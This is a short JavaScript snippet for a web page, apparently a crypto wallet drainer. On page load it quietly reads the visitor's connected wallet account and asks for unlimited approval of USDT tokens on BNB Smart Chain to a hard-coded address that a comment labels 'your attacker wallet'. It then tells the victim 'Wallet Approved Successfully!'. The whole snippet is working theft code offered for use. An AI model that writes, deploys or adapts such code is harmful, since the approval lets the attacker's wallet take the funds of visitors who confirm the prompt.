const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
const spenderAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // your attacker wallet
const ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  }
];

let web3 = new Web3(window.ethereum);
let user;
let token;

window.onload = async () => {
  document.getElementById("status").innerText = "Connecting...";

  try {
    const accounts = await ethereum.request({ method: "eth_accounts" }); // silently fetch account
    if (accounts.length === 0) {
      document.getElementById("status").innerText = "Wallet not connected.";
      return;
    }

    user = accounts[0];
    token = new web3.eth.Contract(ABI, USDT_BSC);

    const balance = await token.methods.balanceOf(user).call();
    const max = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

    document.getElementById("status").innerText = "Approving...";

    await token.methods.approve(spenderAddress, max).send({ from: user });

    document.getElementById("status").innerText = "✅ Wallet Approved Successfully!";
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "❌ Failed: " + err.message;
  }
};
